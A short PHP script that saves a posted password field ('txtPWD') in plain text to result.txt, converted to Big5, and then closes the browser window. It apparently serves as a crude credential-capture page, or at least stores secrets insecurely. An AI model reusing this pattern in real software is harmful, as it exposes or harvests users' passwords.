<?php
  $YourName=$_POST["txtPWD"];
  $myfile = fopen("result.txt", "w") ;
  $txt = $YourName;
  $txt=iconv("UTF-8","big5",$txt);
  fwrite($myfile, $txt);
  fclose($myfile);
?>
<script type="text/javascript">window.close();</script>